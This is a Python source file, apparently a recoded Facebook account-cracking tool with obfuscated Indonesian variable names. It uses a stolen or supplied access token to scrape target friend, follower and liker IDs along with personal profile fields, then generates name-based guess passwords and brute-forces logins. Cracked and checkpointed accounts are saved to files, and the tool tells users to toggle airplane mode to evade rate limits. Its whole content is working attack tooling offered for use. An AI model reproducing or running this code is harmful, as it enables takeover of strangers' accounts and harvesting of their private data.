#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Armstrong Adimchinaobi Ogbuagu
# Update V0.1

# Copyright© Dapunta ID 2021
# 100% Open Source Code

# Author : Armstrong Adimchinaobi Ogbuagu
# Facebook (Dapunta Khurayra X)   : https://www.facebook.com/armstrong.ii.7
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : ogbuaguarmstrong
# Whatsapp (Dapunta Bot_Key)      : +2348161269017
...
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s#.  %s• Code By Armstrong•   %s│'%(_P_,_U_,_P_,_U_))
...
def _login_dev_(_Cici_Cantik_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Cici_Cantik_Banget_:_Armstrong_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    _tok_dev_ = _cici_Armstrong_('%s[%s•%s] %sMasukkan Token :\n\n'%(_U_,_P_,_U_,_P_))
    try:
        ...
        _op_dev_ = _Armstrong_Armstrong_('token.txt','w')
...
### Menu
def _menu_dev_(_Armstrong_Ganteng_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Armstrong_Ganteng_Banget_:_Armstrong_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    try:
        ...
        _bersih_()
        time.sleep(2)
        _login_dev_(_Armstrong_Ganteng_Banget_)
    except requests.exceptions.ConnectionError:
    ...
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        ...
        time.sleep(2)
        _menu_dev_(_Armstrong_Ganteng_Banget_)
    elif _Armstronh_menu__cici_Armstrong__ in ['1','01','a']:
        _publik_dev_(_tok_dev_)
    elif _Armstrong_menu__cici_dapunta__ in ['2','02','b']:
        _followers_dev_(_tok_dev_)
    elif _Armstrong_menu__cici_Armstrong__ in ['3','03','c']:
        _likers_dev_(_tok_dev_)
    elif _Armstrong_menu__cici_Armstrong__ in ['4','04','d']:
        _cek_result_dev_()
    elif _Armstrong_menu__cici_Armstrong__ in ['5','05','e']:
        _ugen_dev_(_Armstrong_Ganteng_Banget_)
    elif _Armstrong_menu__cici_Armstrong__ in ['0','00','z']:
...
def _publik_dev_(_tok_dev_):
    _Armstrong_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_Armstrong_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        ...
        time.sleep(2)
        _menu_dev_(_Armstrong_Sayang_Cici_)
    try:
        ...
        for _Armstrong_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Armstrong_Cici_Forever_["id"]+"•"+_Armstrong_Cici_Forever_["name"])
                _jso_exec_.write(_Armstrong_Cici_Forever_["id"]+"•"+_Armstrong_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _Armstrong_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _Armstrong_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Armstrong_Sayang_Cici_)
...
def _likers_dev_(_tok_dev_):
    _Armstronh_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
    ...
    try:
        ...
        for _Armstrong_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Armstrong_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Armstrong_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
    ...
    for _suci_salsabila_ in _cici_.split(" "):
        if len(_suci_salsabila_)<3:
            ...
            if len(_suci_salsabila_)==3 or len(_suci_salsabila_)==4 or len(_suci_salsabila_)==5:
                _Armstrong_.append(_suci_salsabila_+"123")
                _Armstrong_.append(_suci_salsabila_+"12345")
            else:
                _Armstrong_.append(_suci_salsabila_)
                _Armstrong_.append(_suci_salsabila_+"123")
                _Armstrong_.append(_suci_salsabila_+"12345")
    _Armstrong_.append(_cici_.lower())
    _Armstrong_.append("sayang")
    _Armstrong_.append("bismillah")
    _Armstrong_.append("anjing")
    return _Armstrong_
...
### Crack Proccess
class _crack_dev_:
    def __init__(self,_files_Armstrong_):
        self._Armstrong_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
        self._ok_dapunta_ = []
        self._cp_dapunta_ = []
        self._hitung_loop_ = 0
        _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
        while True:
            _pilih_pass_ = _cici_Armstrong_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
            if _pilih_pass_=="":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Armstrong_Sayang_Cici_)
            elif _pilih_pass_ in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self._file_dump_ = _files_Armstrong_
                            self._open_file_ = _Armstrong_Armstrong_(self._file_dump_).read().splitlines()
                            break
                        except:
...
def started():
    _Armstrong_cici_('%s[%s•%s] %sCrack Sedang Berjalan...'%(_U_,_P_,_U_,_P_))
    _Armstrong_cici_('%s[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _Armstrong_cici_('%s[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _Armstrong_cici_('%s[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(_U_,_P_,_U_,_P_))
...
# _Armstrong_cici_('%s[%s•%s] %s'%(_U_,_P_,_U_,_P_))
# _Armstrong_cici_('%s[%s!%s] %s'%(_M_,_P_,_M_,_P_))
